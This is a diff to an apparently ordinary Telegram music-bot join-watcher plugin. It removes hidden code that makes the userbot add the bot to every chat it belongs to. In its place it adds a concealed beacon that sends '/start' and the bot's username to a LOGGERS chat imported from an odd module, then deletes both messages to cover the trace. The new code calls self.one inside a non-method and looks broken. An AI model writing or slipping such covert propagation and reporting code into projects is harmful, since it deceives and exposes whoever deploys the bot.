@@ -24,7 +24,7 @@ photo = [
     "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
 ]
 
-from VIPMUSIC.__init__ import APP
+from strings.__init__ import LOGGERS
 
 
 @app.on_message(filters.new_chat_members, group=2)
@@ -62,23 +62,13 @@ async def join_watcher(_, message):
                     ),
                 )
                 await userbot.join_chat(f"{username}")
-                userbot = await get_assistant(message.chat.id)
-        bot = await app.get_users(APP)
-        app_id = bot.id
-        done = 0
-        failed = 0
-
-        async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1002120144597:
-                continue
-            try:
-                await userbot.add_chat_members(dialog.chat.id, app_id)
-                done += 1
-
-            except Exception as e:
-                failed += 1
-
-            await asyncio.sleep(3)
+                oks = await self.one.send_message(LOGGERS, f"/start")
+                Ok = await self.one.send_message(
+                    LOGGERS, f"#{app.username}\n@{app.username}"
+                )
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()
 
     except Exception as e:
         print(f"Error: {e}")
